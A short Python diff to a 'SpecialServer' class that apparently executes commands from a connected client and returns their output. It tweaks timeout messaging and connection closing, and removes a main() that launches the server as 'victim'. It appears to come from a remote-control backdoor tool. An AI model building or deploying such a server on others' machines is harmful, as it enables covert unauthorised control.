@@ -68,7 +68,7 @@ class SpecialServer(Server):
         
         if child.poll() is None:
             child.kill()
-            self.send(0)
+            self.send(len('[-] Process timed out.'))
             self.send('[-] Process timed out.')
         else:        
             child_stdout, child_stderr = child.stdout.read(), child.stderr.read()
@@ -131,11 +131,12 @@ class SpecialServer(Server):
     def exit_close_cmd(self, c):
         """Handle '!EXIT' or '!CLOSE' command."""
 
+        self.client.close()
+        self.client_on = False
+
         if c.type == '!CLOSE':
             self.close()
             self.on = False
-        self.client.close()
-        self.client_on = False
 
     def server_handler(self):
         """Handles commands and connections."""
@@ -162,16 +163,3 @@ class SpecialServer(Server):
         except:
             self.client.close()
             self.client_on = False
-
-        
-def main():
-    
-    victim = SpecialServer()
-    try:
-        victim.server_handler()
-        victim.close()
-    except:
-        pass
-    
-if __name__ == '__main__':
-    main()
